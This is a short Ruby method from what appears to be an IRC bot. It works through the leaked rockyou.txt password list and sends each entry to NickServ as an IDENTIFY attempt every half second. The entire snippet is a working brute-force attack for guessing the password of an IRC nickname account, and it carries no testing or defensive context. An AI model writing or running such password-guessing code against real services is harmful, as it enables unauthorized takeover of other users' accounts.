def brute
	chan_send("Running...")
	File.readlines('/home/ninjex/projects/ruby/bot/rockyou.txt').each do |pword|
    pword.strip!   # Remove the trailing whitespace from the line
    if pword != '' # If the line is not a null line (\r\n)
      send_data("PRIVMSG NickServ :IDENTIFY #{pword}")
      sleep(0.5)
    end
  end
end
